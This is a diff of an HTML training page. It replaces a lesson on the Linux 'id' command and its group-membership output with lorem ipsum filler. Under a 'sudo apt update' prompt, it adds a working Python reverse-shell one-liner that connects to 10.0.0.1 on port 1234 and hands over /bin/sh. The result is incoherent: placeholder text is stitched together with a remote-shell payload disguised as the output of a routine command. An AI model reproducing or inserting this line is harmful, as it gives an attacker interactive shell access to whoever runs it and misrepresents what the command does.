@@ -3,31 +3,38 @@
         <div class="main-content">
             <div class="page-content">
                 <div class="row">
-                    <div class="col-md-12 col-xl-12 col-xxl-12">
+                    <div class="col-md-12">
                         <div class="training-module">
-                            <h1>System Information</h1>
+                            <h1>Lorem Ipsum</h1>
                             <hr>
-                            <p>Since we will be working with many different Linux systems, we need to learn the structure and the information about the system, its processes, network configurations, users, directories, user settings, and the corresponding
-                                parameters. Here is a list of the necessary tools that will help us get the above information. Most of them are installed by default.</p>
-                            <p>Let us look at a few examples.</p>
+                            <p> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce ac elementum mi. Donec tincidunt ligula dui, sit amet feugiat magna pretium id. Nulla facilisis dictum diam, at pulvinar sapien ultrices vulputate. Maecenas pellentesque
+                                a mi at viverra. Morbi ac placerat risus. Nam rhoncus nunc placerat nisi pulvinar pulvinar. Maecenas luctus molestie justo, ac ultricies risus egestas vitae. In finibus tristique urna ac elementum. Ut sit amet felis diam.
+                                Ut vulputate mollis nibh a fermentum. Aenean erat diam, consectetur a lectus a, semper blandit quam. Vivamus hendrerit leo non purus porttitor, et posuere ante hendrerit. Nunc mauris ipsum, suscipit in velit sit amet, sollicitudin
+                                interdum massa. Suspendisse commodo viverra urna blandit vehicula. Morbi molestie vulputate fermentum. Donec urna ante, consequat et pharetra nec, blandit eget lorem. Nunc eu leo sit amet ipsum vehicula lobortis. In vehicula
+                                metus id enim tristique faucibus nec quis nisi. Nulla facilisi. In eget mauris turpis. Donec fringilla elementum lacus, sit amet egestas quam porttitor in. Orci varius natoque penatibus et magnis dis parturient montes,
+                                nascetur ridiculus mus. Proin pretium eros nec elementum rutrum. Nunc eget feugiat diam, fringilla tempor augue. Nunc sodales mauris ut maximus egestas. Pellentesque euismod enim at fermentum aliquet. Phasellus sapien lectus,
+                                placerat eget volutpat in, mollis eu sem. Sed lobortis metus velit, accumsan faucibus dolor fermentum eu. Sed at tristique lacus, posuere venenatis urna. Duis non enim et turpis consequat auctor eget id odio. </p>
 
-                            <h4>Id</h4>
-                            <p>The <code>id</code> command expands on the <code>whoami</code> command and prints out our effective group membership and IDs. This can be of interest to penetration testers looking to see what access a user may have and sysadmins
-                                looking to audit account permissions and group membership. In this output, the <code>hackthebox</code> group is of interest because it is non-standard, the <code>adm</code> group means that the user can read log files in
-                                <code>/var/log</code> and could potentially gain access to sensitive information, membership in the <code>sudo</code> group is of particular interest as this means our user can run some or all commands as the all-powerful
-                                <code>root</code> user. Sudo rights could help us escalate privileges or could be a sign to a sysadmin that they may need to audit permissions and group memberships to remove any access that is not required for a given
-                                user to carry out their day-to-day tasks.</p>
+                            <p>Sed at tristique lacus, posuere venenatis urna.</p>
+                            <h4>Nunc sodales mauris</h4>
+                            <p> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce ac elementum mi. Donec tincidunt ligula dui, sit amet feugiat magna pretium id. Nulla facilisis dictum diam, at pulvinar sapien ultrices vulputate. Maecenas pellentesque
+                                a mi at viverra. Morbi ac placerat risus. Nam rhoncus nunc placerat nisi pulvinar pulvinar. Maecenas luctus molestie justo, ac ultricies risus egestas vitae. In finibus tristique urna ac elementum. Ut sit amet felis diam.
+                                Ut vulputate mollis nibh a fermentum. Aenean erat diam, consectetur a lectus a, semper blandit quam. Vivamus hendrerit leo non purus porttitor, et posuere ante hendrerit. Nunc mauris ipsum, suscipit in velit sit amet, sollicitudin
+                                interdum massa. Suspendisse commodo viverra urna blandit vehicula. Morbi molestie vulputate fermentum. Donec urna ante, consequat et pharetra nec, blandit eget lorem. Nunc eu leo sit amet ipsum vehicula lobortis. In vehicula
+                                metus id enim tristique faucibus nec quis nisi. Nulla facilisi. In eget mauris turpis. Donec fringilla elementum lacus, sit amet egestas quam porttitor in. Orci varius natoque penatibus et magnis dis parturient montes,
+                                nascetur ridiculus mus. Proin pretium eros nec elementum rutrum. </p>
                             <div class="window_container">
                                 <div class="window_content">
                                     <div class="window_top">
                                         <span class="window_dot bg-danger"></span>
                                         <span class="window_dot bg-warning"></span>
                                         <span class="window_dot bg-success"></span>
-                                        <span class="window_title">Id</span>
+                                        <span class="window_title">555</span>
                                     </div>
-                                    <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token info punctuation">cry0l1t3@htb[/htb]</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">id</span></span></span>
+                                    <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token info punctuation"></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sudo apt update</span></span></span>
 
-<span class="token output">uid=1000(cry0l1t3) gid=1000(cry0l1t3) groups=1000(cry0l1t3),1337(hackthebox),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
+<span class="token output">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+    s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 </span></code></pre></div>
                             </div>
                         </div>
